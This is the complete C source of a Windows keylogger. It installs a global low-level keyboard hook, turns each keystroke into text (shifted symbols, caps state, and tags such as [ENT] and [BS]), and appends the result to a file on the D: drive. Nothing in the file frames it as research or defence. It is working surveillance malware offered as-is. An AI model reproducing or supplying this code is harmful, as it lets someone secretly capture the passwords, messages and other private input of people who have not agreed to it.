#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <io.h>

#pragma comment(lib, "user32.lib")

#define KEYLOG_LENGTH 256
int shift = 0;
int caps  = 0;
FILE* fd  = NULL;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
int parsekeys(char *str, int vk, int up);

int main(int argc, char **argv) {
    MSG msg;

    // Open file to log to and set LowLevel Keyboard hook
    fd = fopen("D:\\log.bin", "a");
    HHOOK _hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);

    // Message queue to keep sending/receiving messages
    while ( GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Clean-up
    UnhookWindowsHookEx(_hook);
    if (fd) { fclose(fd); fd = NULL; }

    return 0;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (wParam == WM_KEYDOWN || wParam == WM_KEYUP) {
        DWORD vkCode = ((KBDLLHOOKSTRUCT *)lParam)->vkCode;

        int log;
        char str[KEYLOG_LENGTH];

        log = parsekeys(str, vkCode, wParam & 1);
        if (log) {
            fwrite(str, 1, strlen(str), fd);
            fflush(fd);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int parsekeys(char *str, int vk, int up)
{
    // This keeps track if the shift key is pushed down or not
    if (vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT) {
        shift = !up;
        return 0;
    }

    // [SHIFT] is the only key we care about WM_KEYUP on
    if (up) { return 0;    }
    
    // Check against A-Z
    if (vk >= 'A' && vk <= 'Z') {
        // If caps is not on and shift is not held, or if both are on
        if (!(caps^shift))
            vk = tolower(vk);
        snprintf(str, KEYLOG_LENGTH, "%c", vk);
    }

    // Check against 0-9
    else if (vk >= '0' && vk <= '9') {
        char form[3] = "%c";
        if (shift) {
            char *symbols = ")!@#$%^&*(";
            form[0] = symbols[(vk + 2) % 10];
            form[1] = 0;
        }
        snprintf(str, KEYLOG_LENGTH, form, vk);
    }

    // Special keycodes for characters: *+,-./
    else if (vk > 0x69 && vk < 0x70) {
        snprintf(str, KEYLOG_LENGTH, "%c", vk - 0x40);
    }

    // Special characters
    else if (vk >= 0xba && vk <= 0xc0) {
        char form[2] = { 0 };
        char *sym = shift ? ":+<_>?~" : ";=,-./`";
        form[0] = sym[(vk + 4) % 10];
        snprintf(str, KEYLOG_LENGTH, form);
    }
    else if (vk >= 0xdb && vk <= 0xde) {
        char form[2] = { 0 };
        char *sym = shift ? "{|}\"" : "[\\]\'";
        form[0] = sym[(vk + 1) % 4];
        snprintf(str, KEYLOG_LENGTH, form);
    }
    // Single keys
    else if (vk == VK_RETURN) {
        snprintf(str, KEYLOG_LENGTH, "[ENT]\n");
    }
    else if (vk == VK_SPACE) {
        snprintf(str, KEYLOG_LENGTH, " ");
    }
    else if (vk == VK_BACK) {
        snprintf(str, KEYLOG_LENGTH, "[BS]");
    }
    else if (vk == VK_TAB) {
        snprintf(str, KEYLOG_LENGTH, "\t");
    }
    else if (vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL) {
        snprintf(str, KEYLOG_LENGTH, "[CTRL]");
    }
    else if (vk == VK_CAPITAL) {
        caps ^= 1;
        return 0;
    }
    else if (vk == VK_LEFT) {
        snprintf(str, KEYLOG_LENGTH, "[LEFT]");
    }
    else if (vk == VK_RIGHT) {
        snprintf(str, KEYLOG_LENGTH, "[RIGHT]");
    }
    else if (vk == VK_UP) {
        snprintf(str, KEYLOG_LENGTH, "[UP]");
    }
    else if (vk == VK_DOWN) {
        snprintf(str, KEYLOG_LENGTH, "[DOWN]");
    }
    else if (vk == VK_LWIN || vk == VK_RWIN) {
        snprintf(str, KEYLOG_LENGTH, "[WIN]");
    }

    // Unknown key
    else {
        char buf[128];
        int buflen = 128;
        UINT scan_code = (MapVirtualKeyA(vk, MAPVK_VK_TO_VSC) << 16);
        int len = GetKeyNameTextA(scan_code, buf, KEYLOG_LENGTH-3);
        snprintf(str, KEYLOG_LENGTH, "[%s]", buf);
    }
    return 1;
}